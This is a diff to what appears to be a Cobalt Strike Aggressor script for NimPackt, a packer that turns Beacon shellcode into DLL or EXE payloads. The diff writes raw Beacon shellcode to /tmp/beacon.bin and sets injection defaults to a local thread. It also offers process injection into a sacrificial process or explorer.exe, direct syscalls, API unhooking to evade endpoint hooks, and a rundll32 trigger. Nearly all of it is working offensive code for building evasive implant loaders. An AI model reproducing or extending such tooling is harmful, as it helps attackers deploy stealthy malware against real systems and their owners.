@@ -1,10 +1,3 @@
-sub save_raw_shellcode {
-        local('$handle');
-        $handle = openf(">/tmp/beacon.bin");
-        writeb($handle, $1);
-        closef($handle);
-}
-
 sub compile {
         %options = $3;
 
@@ -27,12 +20,17 @@ sub compile {
 
         # Architecture
         if (%options["arch86"] eq "true") {
-                artifact_stageless(%options["listener"], "raw", "x86", %options["proxy"], &save_raw_shellcode);
+                $data = artifact_payload(%options["listener"], "raw", "x86");
                 push(@command, "-32")
         }
         else {
-                artifact_stageless(%options["listener"], "raw", "x64", %options["proxy"], &save_raw_shellcode);
+                $data = artifact_payload(%options["listener"], "raw", "x64");
         }
+
+	# Write payload
+	$cradle = openf(">/tmp/beacon.bin");
+	writeb($cradle, $data);
+	closef($cradle);
 
         # No syscalls
         if (%options["ns"] eq "true") {
@@ -54,17 +52,18 @@ popup attacks {
         item "NimPackt Payload" {
                 local('$dialog %defaults');
                 # setup our defaults
-                %defaults["injectiontype"] = "remote thread, sacrificial process";
+                %defaults["injectiontype"] = "local thread";
                 %defaults["filetype"] = "dll";
                 %defaults["targetproc"] = "explorer.exe";
+                %defaults["nu"] = "true";
 
                 # create our dialog
                 $dialog = dialog("Generate NimPackt executable binary", %defaults, &compile);
                 dialog_description($dialog, "Generate a NimPackt payload. Select the payload type and behaviour. To trigger dll payloads: 'rundll32 payload.dll,Update'.");
                 drow_listener_stage($dialog, "listener", "Listener: ");
                 drow_combobox($dialog, "injectiontype", "Injection type:", @("local thread", "remote thread, sacrificial process", "remote thread, existing process"));
+                drow_text($dialog, "targetproc",  "Target process (remote injection only):");
                 drow_combobox($dialog, "filetype", "File type:", @("dll", "exe"));
-                drow_text($dialog, "targetproc",  "Target process (remote execution only):");
                 drow_checkbox($dialog, "ns", "Direct Syscalls: ", "Do \UNOT\U use direct syscalls to run shellcode (compatible with Window generations 7-10).");
                 drow_checkbox($dialog, "nu", "API Unhooking: ", "Do \UNOT\U unhook user-mode API calls (ntdll) in target thread.");
                 drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload.");
